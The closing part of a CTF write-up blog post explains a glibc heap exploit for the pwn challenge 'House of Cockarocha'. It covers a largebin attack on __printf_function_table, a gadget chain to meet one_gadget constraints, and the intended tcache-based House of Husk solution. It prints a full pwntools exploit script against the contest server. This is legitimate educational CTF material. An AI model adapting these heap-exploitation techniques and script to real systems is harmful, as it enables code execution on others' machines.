<h3 id="lfyg-time-to-put-everything-together-yglf"><lf><yg> Time to put everything together </yg></lf></h3>
<p>Currently, we have a plan: attack <red> __printf_function_table </red>.<br>
And actually it becomes really easy, when we have found how to malloc again in printf function.<br>
Ideally, we want to write heap address to <red> __printf_function_table </red>, because that&rsquo;s the region we control, that&rsquo;s where we can fake a function table beforehand.<br>
Fortunately, there is a heap exploitation technique that helps us write heap address to anywhere we want. It&rsquo;s <a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.31/large_bin_attack.c">Largebin attack</a></p>
<h3 id="lfyg-one_gadget-failed-yglf"><lf><yg> One_gadget failed :(</yg></lf></h3>
<p><img src="/images/cockarocha/fake.png" alt="fake"><br>
After Largebin attack, we was able to write heap address to <red> __printf_function_table </red>, now we can control RIP to everywhere we want.<br>
But one_gadget will always fail, due to the registers cannot satisfy the condition of any one_gadget.<br>
<img src="/images/cockarocha/register.png" alt="register"><br>
<img src="/images/cockarocha/one.png" alt="one"></p>
<p>Whenever I get into this situation, I often try to find a way to pivot the rax register. Because very often in libc, there are a lot of gadgets that is like this: <red>call qword ptr[rax + something] </red><br>
<img src="/images/cockarocha/call.png" alt="call"><br>
I managed to find one very lucky gadget that helps me do exactly this.<br>
<img src="/images/cockarocha/lucky.png" alt="lucky"><br>
<img src="/images/cockarocha/setrax.png" alt="setrax"><br>
This gadget helps me put rax into the region I can control. After this, you can try to do the setcontext trick or whatever.<br>
I just used this to set registers that satisfy the one_gadget condition, then calls one_gagdet directly.</p>
<h3 id="lfyg-the-full-exploit-script-yglf"><lf><yg> The full exploit script </yg></lf></h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#r = gdb.debug(&#34;./cockarocha_patched&#34;)</span>
</span></span><span style="display:flex;"><span>r <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;litctf.live&#34;</span>, <span style="color:#ae81ff">31783</span>)
</span></span><span style="display:flex;"><span><span style="color:#75715e">#context.log_level = 1</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">new</span>(idx,sz):
</span></span><span style="display:flex;"><span>	r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;do?</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>)
</span></span><span style="display:flex;"><span>	r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;in?</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,str(idx)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>	r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;catching?</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,str(sz)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">free</span>(idx,opt):
</span></span><span style="display:flex;"><span>	r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;do?</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;2&#39;</span>)
</span></span><span style="display:flex;"><span>	r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;in?</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,str(idx)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>	r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;(y/N)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,opt)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">look</span>(idx):
</span></span><span style="display:flex;"><span>	r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;do?</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;3&#39;</span>)
</span></span><span style="display:flex;"><span>	r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;at?</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,str(idx)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">dance</span>(idx,s):
</span></span><span style="display:flex;"><span>	r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;do?</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;4&#39;</span>)
</span></span><span style="display:flex;"><span>	r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;(0/1)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>)
</span></span><span style="display:flex;"><span>	r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;with?</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,str(idx)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>	r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;):</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,s)
</span></span><span style="display:flex;"><span>new(<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0x1e90</span><span style="color:#f92672">-</span><span style="color:#ae81ff">8</span>)
</span></span><span style="display:flex;"><span>new(<span style="color:#ae81ff">15</span>,<span style="color:#ae81ff">0x510</span>)
</span></span><span style="display:flex;"><span>free(<span style="color:#ae81ff">0</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;N&#39;</span>)
</span></span><span style="display:flex;"><span>look(<span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;saw:</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>libc_leak <span style="color:#f92672">=</span> u64(r<span style="color:#f92672">.</span>recvline()[<span style="color:#ae81ff">0</span>:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#39;</span>))
</span></span><span style="display:flex;"><span>base <span style="color:#f92672">=</span> libc_leak <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x1ebbe0</span>
</span></span><span style="display:flex;"><span>one_gadget <span style="color:#f92672">=</span> base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xe6af4</span>
</span></span><span style="display:flex;"><span>magic <span style="color:#f92672">=</span> base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x0000000000157c2a</span>
</span></span><span style="display:flex;"><span>set_register <span style="color:#f92672">=</span> base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x0000000000077dfc</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>free(<span style="color:#ae81ff">15</span>,<span style="color:#e6db74">&#39;y&#39;</span>)
</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;LIBC LEAK: &#34;</span> <span style="color:#f92672">+</span> hex(libc_leak))
</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;LIBC BASE ADDRESS: &#34;</span> <span style="color:#f92672">+</span> hex(base))
</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;ONE GADGET: &#34;</span> <span style="color:#f92672">+</span> hex(one_gadget))
</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;magic: &#34;</span> <span style="color:#f92672">+</span> hex(magic))
</span></span><span style="display:flex;"><span>new(<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">0x520</span><span style="color:#f92672">-</span><span style="color:#ae81ff">8</span>)
</span></span><span style="display:flex;"><span>new(<span style="color:#ae81ff">3</span>,<span style="color:#ae81ff">0x510</span><span style="color:#f92672">-</span><span style="color:#ae81ff">8</span>)
</span></span><span style="display:flex;"><span>new(<span style="color:#ae81ff">4</span>,<span style="color:#ae81ff">0x510</span><span style="color:#f92672">-</span><span style="color:#ae81ff">8</span>)
</span></span><span style="display:flex;"><span>new(<span style="color:#ae81ff">5</span>,<span style="color:#ae81ff">0x510</span><span style="color:#f92672">-</span><span style="color:#ae81ff">8</span>)
</span></span><span style="display:flex;"><span>free(<span style="color:#ae81ff">2</span>,<span style="color:#e6db74">&#39;y&#39;</span>)
</span></span><span style="display:flex;"><span>new(<span style="color:#ae81ff">6</span>,<span style="color:#ae81ff">0x530</span><span style="color:#f92672">-</span><span style="color:#ae81ff">8</span>)
</span></span><span style="display:flex;"><span>free(<span style="color:#ae81ff">4</span>,<span style="color:#e6db74">&#39;y&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> (<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;%400$X</span><span style="color:#ae81ff">\0\0</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">2</span> <span style="color:#f92672">+</span> p64(base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1f0ff8</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x20</span>) <span style="color:#f92672">+</span> p64(set_register) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">2</span> <span style="color:#f92672">+</span> p64(one_gadget))<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">0x520</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#75715e">#0x7756f</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># args = 0x1f1350</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># func = 0x1f0ff8</span>
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x530</span>) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x520</span>)
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">+=</span> <span style="color:#ae81ff">0x510</span> <span style="color:#f92672">*</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x41</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x521</span>) <span style="color:#f92672">+</span> p64(base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1ebbe0</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">2</span> <span style="color:#f92672">+</span> p64(magic)<span style="color:#f92672">*</span><span style="color:#ae81ff">90</span>
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>dance(<span style="color:#ae81ff">0</span>,p)
</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><h3 id="lfyg-the-intended-solution-yglf"><lf><yg> The intended solution </yg></lf></h3>
<p><img src="/images/cockarocha/intended.png" alt="intended"><br>
Just like the technique where we overwrite global_max_fast, this is similar to that but we perform the attack with tcache instead.<br>
<img src="/images/cockarocha/tcache.png" alt="tcache"><br>
By making <red> mp_.tcache_bins</red> large, now a chunk with large size is still considered inside tcache range, thus it will take the entries out of bounds, and into heap region where we can control.<br>
=&gt; <red> This means we can control the return address from malloc when called inside printf </red></p>
<p>I said above that:<br>
<em>&ldquo;However, I could not understand the source code well enough to know if somehow we can control the data gets written into this newly malloc-ed chunk&rdquo;</em></p>
<p>When <red>scratch_buffer_set_array_size</red> gets called in printf_positional, it actually <red>mallocs a chunk that will hold data for postional printf</red>.<br>
And we know that when we do %10$p, the data gets printed out <red>comes from the stack</red>, thus that chunk will actually gets <red>filled with data from the stack</red> (and some addtional info) to help printf function in the later stage.</p>
<p>The * is just width specifier which trigger malloc, like I said above when we analyze printf GLIBC source code.</p>
<h3 id="lfyg-conclusion-yglf"><lf><yg> Conclusion </yg></lf></h3>
<p>This was a very fascinating challenge for me. The actual challenge here actually lies inside GLIBC source code instead of the binary.<br>
We have to figure out how vfprintf internal works with heap, instead of the usual new, delete, edit, view function often seen in heap challenges.<br>
And a chance to apply <red>House of Husk</red> is always a delight ;)</p>
    </div>
    <footer class="content__footer"></footer>

            </section>

            <section class="page__aside">
                <div class="aside__about">
<div class="aside__about">
    <img class="about__logo" src="https://piers-n.github.io/images/cat.png" alt="Logo">
<h1 class="about__title">piers</h1>
<p class="about__description">My personal blog on the journey of learning how2pwn</p>
</div>


<ul class="aside__social-links">
    
    <li>
        <a href="https://github.com/piers-n" rel="me" aria-label="GitHub" title="GitHub"><i class="fab fa-github" aria-hidden="true"></i></a>&nbsp;
    </li>
    
    <li>
        <a href="sendhelp2703@gmail.com" rel="me" aria-label="Email" title="Email"><i class="fas fa-envelope" aria-hidden="true"></i></a>&nbsp;
    </li>
    
</ul>
</div>
                <hr>
                <div class="aside__content">
    <p>Writeup on the pwn challenge: House of Cockarocha</p>
    
        <p>
            By Piers, 
            25-07-2022
        </p>
    

                </div>
            </section>

            <footer class="page__footer"><p class="copyright">© 2022</p>
<p class="advertisement">Powered by <a href="https://gohugo.io/">hugo</a> and <a href="https://github.com/joeroe/risotto">risotto</a>.</p>
</footer>

        </div>
    </body>

</html>
